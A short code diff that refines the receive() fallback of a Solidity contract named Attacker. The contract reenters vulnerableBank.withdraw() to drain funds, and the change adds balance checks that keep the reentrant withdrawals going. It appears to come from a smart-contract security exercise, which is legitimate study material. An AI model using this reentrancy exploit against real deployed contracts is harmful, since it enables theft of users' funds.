@@ -12,7 +12,11 @@ contract Attacker {
     }
 
     receive() external payable {
-        if (address(vulnerableBank).balance > 0) {
+        uint myBalance = vulnerableBank.balances(address(this));
+        uint bankBalance = address(vulnerableBank).balance;
+        
+        // Only attempt to withdraw if we have a balance and the bank can cover it
+        if (myBalance > 0 && bankBalance >= myBalance) {
             vulnerableBank.withdraw();
         }
     }
